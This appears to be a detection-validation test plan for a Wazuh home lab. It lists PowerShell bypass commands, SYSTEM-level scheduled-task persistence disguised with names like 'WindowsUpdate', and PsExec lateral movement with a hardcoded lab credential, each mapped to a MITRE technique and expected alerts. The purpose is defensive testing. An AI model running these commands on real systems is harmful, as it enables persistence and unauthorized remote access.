# Attack Simulation — Test Scenarios

## Purpose

Controlled attack simulation to validate detection coverage. Each scenario maps to a specific Wazuh detection rule and MITRE ATT&CK technique. All commands executed from WS01 (domain-joined workstation) under the `svc-admin` or `jsmith` account.

## Pre-Test Checklist

- [ ] VM snapshots taken for DC01 and WS01
- [ ] Wazuh agents confirmed active on both endpoints
- [ ] Sysmon running and generating events (verify with `Get-WinEvent`)
- [ ] Custom rules deployed and Wazuh Manager restarted
- [ ] Wazuh Dashboard open for real-time alert monitoring

---

## Scenario 1: PowerShell Execution Policy Bypass

**MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell  
**Target Detection:** Rules 100100, 100101  
**Executed From:** WS01 as `LAB\jsmith`

### Commands

```powershell
# Test 1: Direct bypass flag
powershell.exe -ExecutionPolicy Bypass -Command "Write-Host 'Detection Test 1'"

# Test 2: Abbreviated flag with hidden window
powershell.exe -ep bypass -nop -w hidden -c "whoami; hostname"

# Test 3: Encoded command (base64 of "Write-Host 'Detection Test 3'")
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcARABlAHQAZQBjAHQAaQBvAG4AIABUAGUAcwB0ACAAMwAn

# Test 4: Execution via cmd parent process
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Temp\test-payload.ps1
```

### Expected Outcome

| Test | Expected Rule | Expected Level |
|---|---|---|
| Test 1 | 100100 | 12 |
| Test 2 | 100100 | 12 |
| Test 3 | 100101 | 14 |
| Test 4 | 100100 | 12 |

---

## Scenario 2: Scheduled Task Persistence

**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task  
**Target Detection:** Rules 100200, 100201, 100202  
**Executed From:** WS01 as `LAB\svc-admin` (elevated)

### Commands

```cmd
# Test 1: Basic task creation
schtasks /create /tn "TestTask1" /tr "C:\Temp\test.exe" /sc daily /st 09:00 /f

# Test 2: SYSTEM-level persistence at logon
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\beacon.exe" /sc onlogon /ru SYSTEM /f

# Test 3: Recurring task every 15 minutes as SYSTEM
schtasks /create /tn "HealthMonitor" /tr "powershell.exe -ep bypass -File C:\Users\Public\check.ps1" /sc minute /mo 15 /ru SYSTEM /f

# Test 4: Startup persistence
schtasks /create /tn "Maintenance" /tr "C:\ProgramData\update.exe" /sc onstart /ru SYSTEM /f

# Cleanup after testing
schtasks /delete /tn "TestTask1" /f
schtasks /delete /tn "WindowsUpdate" /f
schtasks /delete /tn "HealthMonitor" /f
schtasks /delete /tn "Maintenance" /f
```

### Expected Outcome

| Test | Expected Rules | Expected Levels |
|---|---|---|
| Test 1 | 100200 | 10 |
| Test 2 | 100200, 100201, 100202 | 10, 14, 14 |
| Test 3 | 100200, 100201 | 10, 14 |
| Test 4 | 100200, 100201, 100202 | 10, 14, 14 |

---

## Scenario 3: Lateral Movement via SMB

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares  
**Target Detection:** Rules 100300, 100301  
**Executed From:** WS01 as `LAB\svc-admin`

### Commands

```cmd
# Test 1: Map admin share
net use \\192.168.56.10\C$ /user:LAB\svc-admin Password123!

# Test 2: Copy file to remote system
copy C:\Temp\test-payload.txt \\192.168.56.10\C$\Windows\Temp\

# Test 3: PsExec remote execution
PsExec.exe \\192.168.56.10 -u LAB\svc-admin -p Password123! cmd.exe /c "whoami && hostname"

# Test 4: PsExec SYSTEM-level remote shell
PsExec.exe \\192.168.56.10 -u LAB\svc-admin -p Password123! -s cmd.exe

# Cleanup
net use \\192.168.56.10\C$ /delete
del \\192.168.56.10\C$\Windows\Temp\test-payload.txt
```

### Expected Outcome

| Test | Expected Rules | Expected Levels |
|---|---|---|
| Test 1 | 100300, 100301 | 10, 14 |
| Test 2 | 100300 | 10 |
| Test 3 | 100300, 100301 | 10, 14 |
| Test 4 | 100300, 100301 | 10, 14 |

---

## Post-Test Validation

After executing all scenarios:

1. Review Wazuh Dashboard → Security Events for triggered alerts
2. Verify each test case produced the expected rule ID and alert level
3. Check for any missed detections and document in [findings/detection-analysis.md](../findings/detection-analysis.md)
4. Revert VMs to pre-test snapshots
5. Document any unexpected alerts or false positives
